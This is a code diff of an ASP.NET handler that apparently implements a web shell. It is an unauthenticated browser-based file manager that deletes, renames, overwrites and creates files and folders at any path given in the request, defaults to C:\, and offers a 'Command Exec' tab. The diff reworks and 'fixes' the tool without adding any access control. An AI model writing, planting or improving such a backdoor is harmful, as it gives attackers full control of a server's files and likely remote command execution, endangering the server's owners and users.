@@ -1,66 +1,62 @@
-<%@ WebHandler Language="C#" Class="EnhancedFileBrowser" %>
+<%@ WebHandler Language="C#" Class="FixedEnhancedFileBrowser" %>
 using System;
 using System.Web;
 using System.IO;
 using System.Text;
 using System.Diagnostics;
 
-public class EnhancedFileBrowser : IHttpHandler
+public class FixedEnhancedFileBrowser : IHttpHandler
 {
+    private const string DefaultFolder = "C:\\"; // Ya koi aapke server ki valid default directory
+
     public void ProcessRequest(HttpContext context)
     {
         context.Response.ContentType = "text/html; charset=utf-8";
 
-        // Fetch action & path from request
         string action = context.Request["action"];
-        string currentPath = context.Request["path"];
+        string requestedPath = context.Request["path"];
 
-        // Validate currentPath: use default folder if invalid
-        if (string.IsNullOrWhiteSpace(currentPath) || !Directory.Exists(currentPath))
-        {
-            currentPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-        }
+        // Strict validation for requestedPath
+        string currentPath = ValidatePathOrDefault(requestedPath);
 
         StringBuilder html = new StringBuilder();
-        html.Append("<html><head><title>Enhanced File Browser</title>");
+        html.Append("<html><head><title>Fixed Enhanced File Browser</title>");
         html.Append("<style>body{font-family:Segoe UI,sans-serif;} " +
-                    "nav { margin-bottom: 20px; } " +
-                    "nav a { margin-right: 15px; text-decoration:none; font-weight:bold; } " +
-                    "table { border-collapse: collapse; width: 100%; } " +
-                    "th, td {border: 1px solid #ccc; padding: 8px; text-align:left;} " +
-                    "tr:hover {background-color: #f0f0f0;} " +
-                    ".error{color:red;} .success{color:green;} " +
-                    ".tab {display:none;} .tab.active{display:block;} " +
-                    ".button {padding:5px 10px; margin:2px; cursor:pointer;} " +
-                    "</style>");
-        html.Append("<script>" +
-            "function showTab(id) {" +
-            "  var tabs = document.getElementsByClassName('tab');" +
-            "  for(var i=0;i<tabs.length;i++) { tabs[i].classList.remove('active'); }" +
-            "  document.getElementById(id).classList.add('active');" +
-            "}" +
-            "function confirmDelete(path) {" +
-            "  if(confirm('Are you sure to delete ' + path + '?')) {" +
-            "    window.location.href = '?action=delete&path=' + encodeURIComponent(path);" +
-            "  }" +
-            "}" +
-            "function renameFile(path) {" +
-            "  var newName = prompt('Enter new name:', '');" +
-            "  if(newName) {" +
-            "    var url = '?action=rename&path=' + encodeURIComponent(path) + '&newname=' + encodeURIComponent(newName);" +
-            "    window.location.href = url;" +
-            "  }" +
-            "}" +
-            "function editFile(path) {" +
-            "  var url = '?action=editform&path=' + encodeURIComponent(path);" +
-            "  window.location.href = url;" +
-            "}" +
-            "</script>");
+            "nav { margin-bottom: 20px; } " +
+            "nav a { margin-right: 15px; text-decoration:none; font-weight:bold; } " +
+            "table { border-collapse: collapse; width: 100%; } " +
+            "th, td {border: 1px solid #ccc; padding: 8px; text-align:left;} " +
+            "tr:hover {background-color: #f0f0f0;} " +
+            ".error{color:red;} .success{color:green;} " +
+            ".tab {display:none;} .tab.active{display:block;} " +
+            ".button {padding:5px 10px; margin:2px; cursor:pointer;} " +
+            "</style>");
+        html.Append(@"<script>
+            function showTab(id) {
+                var tabs = document.getElementsByClassName('tab');
+                for(var i=0;i<tabs.length;i++) { tabs[i].classList.remove('active'); }
+                document.getElementById(id).classList.add('active');
+            }
+            function confirmDelete(path) {
+                if(confirm('Are you sure to delete ' + path + '?')) {
+                    window.location.href = '?action=delete&path=' + encodeURIComponent(path);
+                }
+            }
+            function renameFile(path) {
+                var newName = prompt('Enter new name:', '');
+                if(newName) {
+                    var url = '?action=rename&path=' + encodeURIComponent(path) + '&newname=' + encodeURIComponent(newName);
+                    window.location.href = url;
+                }
+            }
+            function editFile(path) {
+                var url = '?action=editform&path=' + encodeURIComponent(path);
+                window.location.href = url;
+            }
+            </script>");
         html.Append("</head><body>");
-        html.Append("<nav>" +
-                    "<a href='javascript:void(0)' onclick=\"showTab('browseTab')\">Browse Files</a>" +
-                    "<a href='javascript:void(0)' onclick=\"showTab('cmdTab')\">Command Exec</a>" +
-                    "</nav>");
+        html.Append("<nav><a href=\"javascript:void(0)\" onclick=\"showTab('browseTab')\">Browse Files</a> | ");
+        html.Append("<a href=\"javascript:void(0)\" onclick=\"showTab('cmdTab')\">Command Exec</a></nav>");
 
         string message = PerformActions(context, action, currentPath, out currentPath);
         if (!string.IsNullOrEmpty(message))
@@ -80,6 +76,24 @@ public class EnhancedFileBrowser : IHttpHandler
         context.Response.Write(html.ToString());
     }
 
+    private string ValidatePathOrDefault(string path)
+    {
+        if (string.IsNullOrWhiteSpace(path))
+            return DefaultFolder;
+        try
+        {
+            // If directory exists, return as is
+            if (Directory.Exists(path))
+                return path;
+            // If it's a file, return directory containing file
+            if (File.Exists(path))
+                return Path.GetDirectoryName(path);
+        }
+        catch { }
+        // Fallback
+        return DefaultFolder;
+    }
+
     private string PerformActions(HttpContext context, string action, string currentPath, out string updatedPath)
     {
         updatedPath = currentPath;
@@ -87,98 +101,101 @@ public class EnhancedFileBrowser : IHttpHandler
 
         try
         {
-            if (action == "delete")
+            switch (action.ToLower())
             {
-                string target = context.Request["path"];
-                if (string.IsNullOrWhiteSpace(target))
-                    return "<span class='error'>Delete failed: Path parameter missing.</span>";
-                if (File.Exists(target))
-                {
-                    File.Delete(target);
-                    return $"<span class='success'>File '{HttpUtility.HtmlEncode(target)}' deleted.</span>";
-                }
-                else if (Directory.Exists(target))
-                {
-                    Directory.Delete(target, true);
-                    return $"<span class='success'>Folder '{HttpUtility.HtmlEncode(target)}' deleted.</span>";
-                }
-                else
-                {
-                    return $"<span class='error'>Path not found: '{HttpUtility.HtmlEncode(target)}'</span>";
-                }
-            }
-            else if (action == "rename")
-            {
-                string target = context.Request["path"];
-                string newName = context.Request["newname"];
-                if (string.IsNullOrWhiteSpace(target))
-                    return "<span class='error'>Rename failed: Original path missing.</span>";
-                if (string.IsNullOrWhiteSpace(newName))
-                    return "<span class='error'>Rename failed: New name missing.</span>";
-                string newFullPath = Path.Combine(Path.GetDirectoryName(target), newName);
-                if (File.Exists(target))
-                {
-                    File.Move(target, newFullPath);
-                    updatedPath = Path.GetDirectoryName(newFullPath);
-                    return $"<span class='success'>File renamed to '{HttpUtility.HtmlEncode(newName)}'.</span>";
-                }
-                else if (Directory.Exists(target))
-                {
-                    Directory.Move(target, newFullPath);
-                    updatedPath = Path.GetDirectoryName(newFullPath);
-                    return $"<span class='success'>Folder renamed to '{HttpUtility.HtmlEncode(newName)}'.</span>";
-                }
-                else
-                {
-                    return $"<span class='error'>Original path not found.</span>";
-                }
-            }
-            else if (action == "editform")
-            {
-                return null; // handled later
-            }
-            else if (action == "saveedit")
-            {
-                string filePath = context.Request["path"];
-                if (string.IsNullOrWhiteSpace(filePath))
-                    return "<span class='error'>Save failed: Path missing.</span>";
-                if (File.Exists(filePath))
-                {
-                    string content = context.Request.Form["filecontent"];
-                    File.WriteAllText(filePath, content);
-                    updatedPath = Path.GetDirectoryName(filePath);
-                    return $"<span class='success'>File '{HttpUtility.HtmlEncode(filePath)}' saved successfully.</span>";
-                }
-                else
-                {
-                    return $"<span class='error'>File not found for saving.</span>";
-                }
-            }
-            else if (action == "newfolder")
-            {
-                string folderName = context.Request["foldername"];
-                if (string.IsNullOrWhiteSpace(folderName))
-                    return "<span class='error'>Folder creation failed: Folder name missing.</span>";
-                string newDir = Path.Combine(currentPath, folderName);
-                if (!Directory.Exists(newDir))
-                {
-                    Directory.CreateDirectory(newDir);
-                    return $"<span class='success'>Folder '{HttpUtility.HtmlEncode(folderName)}' created.</span>";
-                }
-                else
-                {
-                    return $"<span class='error'>Folder already exists.</span>";
-                }
-            }
-            else if (action == "cmdexec")
-            {
-                return null; // handled in render
+                case "delete":
+                    {
+                        string target = context.Request["path"];
+                        if (string.IsNullOrWhiteSpace(target))
+                            return "<span class='error'>Delete failed: Path missing.</span>";
+                        if (File.Exists(target))
+                        {
+                            File.Delete(target);
+                            return $"<span class='success'>File '{HttpUtility.HtmlEncode(target)}' deleted.</span>";
+                        }
+                        else if (Directory.Exists(target))
+                        {
+                            Directory.Delete(target, true);
+                            return $"<span class='success'>Folder '{HttpUtility.HtmlEncode(target)}' deleted.</span>";
+                        }
+                        else
+                        {
+                            return $"<span class='error'>Path not found: '{HttpUtility.HtmlEncode(target)}'</span>";
+                        }
+                    }
+                case "rename":
+                    {
+                        string target = context.Request["path"];
+                        string newName = context.Request["newname"];
+                        if (string.IsNullOrWhiteSpace(target))
+                            return "<span class='error'>Rename failed: Path missing.</span>";
+                        if (string.IsNullOrWhiteSpace(newName))
+                            return "<span class='error'>Rename failed: New name missing.</span>";
+
+                        string newFullPath = Path.Combine(Path.GetDirectoryName(target), newName);
+
+                        if (File.Exists(target))
+                        {
+                            File.Move(target, newFullPath);
+                            updatedPath = Path.GetDirectoryName(newFullPath);
+                            return $"<span class='success'>File renamed to '{HttpUtility.HtmlEncode(newName)}'.</span>";
+                        }
+                        else if (Directory.Exists(target))
+                        {
+                            Directory.Move(target, newFullPath);
+                            updatedPath = Path.GetDirectoryName(newFullPath);
+                            return $"<span class='success'>Folder renamed to '{HttpUtility.HtmlEncode(newName)}'.</span>";
+                        }
+                        else
+                        {
+                            return $"<span class='error'>Original path not found.</span>";
+                        }
+                    }
+                case "editform":
+                    {
+                        // Handled in rendering, nothing here
+                        return null;
+                    }
+                case "saveedit":
+                    {
+                        string filePath = context.Request["path"];
+                        if (string.IsNullOrWhiteSpace(filePath))
+                            return "<span class='error'>Save failed: Path missing.</span>";
+                        if (File.Exists(filePath))
+                        {
+                            string content = context.Request.Form["filecontent"];
+                            File.WriteAllText(filePath, content);
+                            updatedPath = Path.GetDirectoryName(filePath);
+                            return $"<span class='success'>File '{HttpUtility.HtmlEncode(filePath)}' saved successfully.</span>";
+                        }
+                        else
+                        {
+                            return $"<span class='error'>File not found for saving.</span>";
+                        }
+                    }
+                case "newfolder":
+                    {
+                        string folderName = context.Request["foldername"];
+                        if (string.IsNullOrWhiteSpace(folderName))
+                            return "<span class='error'>Folder creation failed: Folder name missing.</span>";
+                        string newDir = Path.Combine(currentPath, folderName);
+                        if (!Directory.Exists(newDir))
+                        {
+                            Directory.CreateDirectory(newDir);
+                            return $"<span class='success'>Folder '{HttpUtility.HtmlEncode(folderName)}' created.</span>";
+                        }
+                        else
+                        {
+                            return $"<span class='error'>Folder already exists.</span>";
+                        }
+                    }
             }
         }
         catch (Exception ex)
         {
             return $"<span class='error'>Error: {HttpUtility.HtmlEncode(ex.Message)}</span>";
         }
+
         return null;
     }
 
@@ -322,7 +339,7 @@ public class EnhancedFileBrowser : IHttpHandler
         if (bytes < 1024 * 1024 * 1024) return (bytes / (1024.0 * 1024)).ToString("0.0") + " MB";
         return (bytes / (1024.0 * 1024 * 1024)).ToString("0.0") + " GB";
     }
-
+    
     private string DownloadFile(HttpContext context, string file)
     {
         try
@@ -338,7 +355,7 @@ public class EnhancedFileBrowser : IHttpHandler
             context.Response.TransmitFile(file);
             context.Response.Flush();
             context.Response.End();
-            return null; // will never reach here due to Response.End()
+            return null; // never reached after Response.End()
         }
         catch (Exception ex)
         {
